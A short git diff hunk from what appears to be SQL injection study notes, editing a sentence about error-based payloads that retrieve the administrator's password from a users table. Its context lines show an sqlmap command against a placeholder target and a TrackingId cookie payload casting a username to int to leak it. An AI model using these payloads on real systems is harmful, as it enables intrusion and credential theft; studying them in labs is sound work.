@@ -2031,7 +2031,7 @@ sqlmap -v -u 'https://TARGET.NET/search?term=x&organizeby=DATE&journalist=&cache
 
 ![identify-visual-error-based-sqli.png](images/identify-visual-error-based-sqli.png)  
 
->The two payloads validate administrator record and then to retrieve the password for the Administrator account from the `user` table in the database, from the columns `username` and `password`.  
+>The two payloads validate administrator record is the first record, and then to retrieve the password for the Administrator account from the `user` table in the database, from the columns `username` and `password`.  
 
 ```
 TrackingId=x'||CAST((SELECT username FROM users LIMIT 1) AS int)--;
